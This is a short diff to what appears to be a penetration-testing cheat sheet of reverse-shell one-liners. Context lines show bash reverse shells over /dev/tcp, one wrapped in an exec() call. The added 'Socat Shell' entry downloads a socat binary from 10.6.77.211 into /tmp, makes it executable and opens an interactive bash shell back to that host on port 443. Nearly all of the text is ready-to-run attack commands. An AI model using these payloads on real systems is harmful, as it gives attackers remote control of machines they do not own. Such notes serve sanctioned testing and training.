@@ -95,6 +95,11 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/0.0.0.0/4445 0>&1'");
 bash -c 'bash -i >& /dev/tcp/0.0.0.0/4444 0>&1'
 ```
 
+- Socat Shell
+```sh
+wget -q 10.6.77.211/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.6.77.211:443
+```
+
 ## Upgrading shell
 ___
 - Upgrade shell to bash/pty
